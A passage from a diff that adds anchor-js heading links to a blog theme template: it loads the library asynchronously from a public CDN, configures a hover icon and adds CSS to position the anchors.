+    if (c) {
+      o.addEventListener('load', function(e) {
+        c(null, e);
+      }, false);
+    }
+    s.parentNode.insertBefore(o, s);
+  };
+</script>
+<script type="text/javascript">
+  //anchor-js, Doc:http://bryanbraun.github.io/anchorjs/
+  async ("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function() {
+    anchors.options = {
+      visible: 'hover',
+      placement: 'left',
+      // icon: 'ℬ'
+      icon: '❡'
+    };
+    anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+  });
+</script>
+<style>
+  /* place left on bigger screen */
+  @media all and (min-width: 800px) {
+    .anchorjs-link {
+      position: absolute;
+      left: -0.75em;
+      font-size: 1.1em;
+      margin-top: -0.1em;
+    }
+  }
+</style>
+
+<!-- anchorjs end -->
+
 
 
 		<!-- Footer (contains ThemeColor、viewer) -->
